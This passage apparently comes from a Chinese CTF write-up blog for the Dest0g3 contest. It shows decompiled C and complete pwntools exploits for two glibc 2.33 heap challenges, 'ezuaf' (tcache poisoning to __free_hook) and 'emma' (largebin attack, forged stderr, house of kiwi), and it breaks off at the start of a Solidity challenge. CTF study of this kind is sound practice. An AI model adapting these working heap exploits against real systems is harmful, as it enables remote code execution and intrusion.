Dest0g3?\n&#x27;</span>,<span class="string">&#x27;%1314520c%12$n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ezuaf"><a href="#ezuaf" class="headerlink" title="ezuaf"></a>ezuaf</h3><p>主要代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line"></span><br><span class="line">  sub_11C5(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v3 = read_n();</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">delete</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invaild Choice!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please tell me the index: &quot;</span>);</span><br><span class="line">  v0 = read_n();</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)&amp;unk_40C0 + v0) &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v0 &lt;= <span class="number">0xF</span> )</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)&amp;unk_40C0 + v0));</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid Index!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>高版本（2.33）的UAF漏洞利用，在tcache里写入__free_hook，再写入system。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26427</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.33.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;4. show\n: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Please tell me its size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;4. show\n: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Please tell me the index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Please tell me its content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;4. show\n: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Please tell me the index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;4. show\n: &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Please tell me the index: \n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x7f</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1e0c00</span></span><br><span class="line"><span class="comment">#print(hex(libc_base))</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">heap_addr1 = ((u64(r.recv(<span class="number">8</span>)) &lt;&lt; <span class="number">12</span>) % (<span class="number">2</span>**<span class="number">64</span>)) + <span class="number">0x380</span></span><br><span class="line"><span class="comment">#print(hex(heap_addr1))</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">free_hook = libc_base + libc.sym.__free_hook</span><br><span class="line"><span class="comment">#print(hex(free_hook))</span></span><br><span class="line">heap_addr2 = (((u64(r.recv(<span class="number">8</span>)) ^ heap_addr1) &lt;&lt; <span class="number">12</span>) % (<span class="number">2</span>**<span class="number">64</span>)) + <span class="number">0x330</span></span><br><span class="line"><span class="comment">#print(hex(heap_addr2))</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">next</span> = ((heap_addr2 &gt;&gt; <span class="number">12</span>) % (<span class="number">2</span>**<span class="number">64</span>)) ^ free_hook</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="built_in">next</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.sym.system</span><br><span class="line"><span class="comment">#print(hex(system_addr))</span></span><br><span class="line">add(<span class="number">0x40</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="emma"><a href="#emma" class="headerlink" title="emma"></a>emma</h3><p>主要代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  init_0();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read_n();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">delete</span>(a1, a2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_12:</span><br><span class="line">      a1 = <span class="string">&quot;Invaild Choice!&quot;</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invaild Choice!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( v3 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          show(a1, a2);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          add(a1, a2);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          edit(a1, a2);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  read_n();</span><br><span class="line">  v2 = v0;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">  read_n();</span><br><span class="line">  v3 = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">1047</span> &amp;&amp; v1 &lt;= <span class="number">4096</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    buf = <span class="built_in">malloc</span>(v1);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Content&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, v3);</span><br><span class="line">    qword_4060[v2] = buf;</span><br><span class="line">    dword_40E0[v2] = v3;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  read_n();</span><br><span class="line">  v2 = v0;</span><br><span class="line">  result = qword_4060[v0];</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Content&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, (<span class="keyword">void</span> *)qword_4060[v2], (<span class="keyword">int</span>)dword_40E0[v2]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  read_n();</span><br><span class="line">  v3 = v0;</span><br><span class="line">  v1 = qword_4060[v0];</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">    LODWORD(v1) = <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)qword_4060[v3]);</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  read_n();</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)&amp;qword_4060 + v0) )</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)&amp;qword_4060 + v0));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样是高版本（2.33）的UAF，最小申请0x417大小的chunk；</p><p>先用负idx修改stderr指针，再利用LargeBin Attack修改__pointer_chk_guard，伪造stderr修改vtable，最后改topchunk触发house of kiwi。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;25443&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)   </span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.33.so&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Content&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,data</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Content&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROL</span>(<span class="params">content, key</span>):</span></span><br><span class="line">    tmp = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(tmp[key:] + tmp[:key], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x460</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">0</span>)*<span class="number">4</span> + <span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x420</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x440</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x420</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x01&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = (u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) &gt;&gt; <span class="number">16</span>) - libc.sym.__malloc_hook - <span class="number">0x71</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x470</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">heap_base = heap_addr - <span class="number">0x290</span></span><br><span class="line">global_max_fast = libc_base + <span class="number">0x1e3e78</span></span><br><span class="line">stderr_chain = libc_base + <span class="number">0x1e1648</span></span><br><span class="line">__pointer_chk_guard = libc_base + <span class="number">0x1ed5b0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(__pointer_chk_guard))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+<span class="number">0x1e1000</span>)*<span class="number">2</span> + p64(heap_addr) + p64(__pointer_chk_guard-<span class="number">0x20</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x480</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x40</span>) </span><br><span class="line"></span><br><span class="line">target = libc_base + libc.sym.system</span><br><span class="line">io_cookie_jumps = libc_base + <span class="number">0x1e1a20</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE = p64(<span class="number">0x00000000fbad2087</span>)+<span class="number">3</span> * p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xffffffffffffffff</span>) </span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>) </span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">fake_IO_FILE += p64(libc_base + <span class="number">0x1e3660</span>) </span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(io_cookie_jumps + <span class="number">0x40</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base + <span class="number">0x300</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(ROL(target ^ (heap_base+<span class="number">0xb30</span>),<span class="number">0x11</span>))</span><br><span class="line"></span><br><span class="line">add(-<span class="number">4</span>,<span class="number">0x500</span>,fake_IO_FILE)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x700</span>,<span class="string">&#x27;6&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x500</span>,<span class="string">&#x27;7&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x508</span>+p64(<span class="number">0x300</span>))</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0xff0</span>,<span class="string">&#x27;8&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="BLOCKCHAIN"><a href="#BLOCKCHAIN" class="headerlink" title="BLOCKCHAIN"></a>BLOCKCHAIN</h2><h3 id="Where-the-flag？"><a href="#Where-the-flag？" class="headerlink" title="Where the flag？"></a>Where the flag？</h3><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">contract find&#123;</span><br><span class="line">    uint96 private a=7855;</span><br><span class="line">    address private owner=msg.sender;</span><br><span class="line">    bool private f=false;</span><br><span class="line">    bool private t=true;</span><br><span class="line">    string[] private flag=[flag1,flag2];</span><br><span 